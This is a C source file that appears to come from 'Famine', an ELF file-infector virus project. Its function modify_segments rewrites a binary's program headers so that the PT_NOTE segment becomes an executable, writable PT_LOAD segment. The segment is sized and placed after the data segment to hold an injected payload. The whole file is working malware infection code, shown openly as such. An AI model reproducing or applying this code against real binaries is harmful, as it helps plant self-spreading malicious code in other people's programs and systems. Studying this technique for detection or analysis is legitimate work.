#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static inline Elf64_Phdr *get_segment(const struct elf *file, Elf64_Half index)
{
	Elf64_Phdr *ret;

	ret = (Elf64_Phdr *)((void *)file->ptr + sizeof(Elf64_Ehdr) + (sizeof(Elf64_Phdr) * index));

	if ((void *)ret >= file->ptr + file->size)
		return NULL;

	return ret;
}

static inline bool is_note_segment(const Elf64_Phdr *segment)
{
	return segment->p_type == PT_NOTE;
}

static inline bool is_data_segment(const Elf64_Phdr *segment)
{
	if (segment->p_type != PT_LOAD)
		return false;

	return segment->p_flags == (PF_W | PF_R);
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void modify_segments(struct elf *file)
{
	const Elf64_Ehdr *header = (const Elf64_Ehdr *)file->ptr;
	Elf64_Phdr *segment;

	for (Elf64_Half index = 0; index < header->e_phnum; index++)
	{
		if ((segment = get_segment(file, index)) == NULL)
			return ;

		if (is_data_segment(segment) == true)
		{
			file->data = segment;
		}
		if (is_note_segment(segment) == true)
		{
			file->addr_padding = (file->data->p_vaddr + file->data->p_memsz) % file->data->p_align;
			file->offs_padding = file->data->p_align - ((file->data->p_offset + file->data->p_filesz) % file->data->p_align);

			segment->p_filesz = PAYLOAD_SIZE;
			segment->p_memsz = PAYLOAD_SIZE;

			segment->p_type = PT_LOAD;
			segment->p_flags = (PF_X | PF_W | PF_R);
			segment->p_align = 0x1000;

			segment->p_vaddr = ((file->data->p_vaddr + file->data->p_memsz) + (file->data->p_align - file->addr_padding));
			segment->p_offset = ((file->data->p_offset + file->data->p_filesz) + file->offs_padding);

			file->note = segment;
		}
	}
}